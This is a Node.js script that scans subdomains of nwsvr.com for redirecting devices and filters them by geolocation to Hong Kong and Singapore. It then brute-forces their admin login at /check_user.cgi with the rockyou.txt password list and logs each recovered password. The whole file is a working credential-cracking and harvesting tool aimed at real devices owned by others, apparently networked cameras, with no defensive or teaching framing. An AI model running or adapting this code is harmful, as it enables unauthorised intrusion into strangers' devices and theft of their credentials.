var request = require('request');
var winston = require('winston');
var sleep = require('sleep');
var satelize = require('satelize');
var readline = require('readline');
var fs = require('fs');
var util = require('util');
var stream = require('stream');
var es = require('event-stream');

var logger = new (winston.Logger)({
  transports: [
  	new (winston.transports.Console)(),
    new (winston.transports.File)({
      name: 'info',
      filename: './log/device.info.log',
      level: 'info'
    }),
    new (winston.transports.File)({
      name: 'error',
      filename: './log/device.error.log',
    })
  ]
});

var pwArray = [];
var conn = 0;

var s = fs.createReadStream('./rockyou.txt')
	.pipe(es.split())
	.pipe(es.mapSync(function(line){
		s.pause();
		pwArray.push(line);
		s.resume();
	})
	.on('error', function(){
		console.log('Read file error');
	})
	.on('end', function(){
		console.log('Read file end, start spider');
		startSpider();
		//login('138.19.85.253','http://138.19.85.253');
	})
);


function startSpider() {
	for(a=117 ; a<118 ; a++) {
		for(b=97 ; b<123 ; b++) {
			for(c=97 ; c<123 ; c++) {
				for(d=97 ; d<123 ; d++) {
					
					while(conn > 2) {
						sleep.usleep(100000);
					}

					var url = 'http://002' + String.fromCharCode(a,b,c,d) + '.nwsvr.com';
					getLink(url);
					sleep.usleep(500);
				}
			}
		}
	}
}

//url = 'http://002mhew.nwsvr.com';
//getLink(url);
function getLink(url) {
	request({url: url, followRedirect : false}, function (error, response, body) {
		
		if (!error && response.statusCode == 302) {		
			//console.log('Get url : ' + response.headers['location']);
            checkCountry(url,response.headers['location']);
			//login(url,response.headers['location']);
		}
	});
}

//Check country
function checkCountry(url,link) {
    var ip = link.substr(7);
    if(ip.indexOf(':')) {
        ip = ip.substr(0,ip.indexOf(':'));
    }
    try {
    satelize.satelize({ip:ip}, function(err, payload) {
        try{
            if((payload.country_code == 'HK') || (payload.country_code == 'SG')) {
			    login(url,link); 
				conn++;
            }   
        }
        catch(err) {}
    });
    }
    catch(err) {}
}

function login(url,link) {

	pw = pwArray[0];

	tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';

	//console.log(tmpLink);
	request({url: tmpLink}, function (error, response, body) {
	
		body = ''+body; 	
		body = body.substring(body.indexOf('pwd=\'')+5);
		body = body.substring(0,body.indexOf('\';'));
	
		if (!error && response.statusCode == 200) {
			console.log(url + " password found : " + body);
			conn--;
		} else if(!error && response.statusCode == 401) {
			console.log('Relogin : '+ url);
			relogin(url,link,1,0);
		} 
	});
}

function relogin(url,link,pwInd,errCount) {

	//console.log(url + " relogin pwInd : " + pwInd + " errCount : "+errCount);

	sleep.usleep(500000);

    pw = pwArray[pwInd];

    tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';

    request({url: tmpLink}, function (error, response, body) {

		body = ''+body;
        body = body.substring(body.indexOf('pwd=\'')+5);
        body = body.substring(0,body.indexOf('\';'));

		if (!error && response.statusCode == 200) {
			console.log(url + " relogin password found : " + body);
	        conn--;
		} else if(pwInd >= pwArray.length) {
			conn--;
	    } else if(!error && response.statusCode == 401) {
		    relogin(url,link,pwInd+1,0);
	    } else {
			if(errCount < 10) {
				relogin(url,link,pwInd,errCount+1);
			} else {
				console.log('Error Stoped : ' + error);
			}
	    }
	});
}

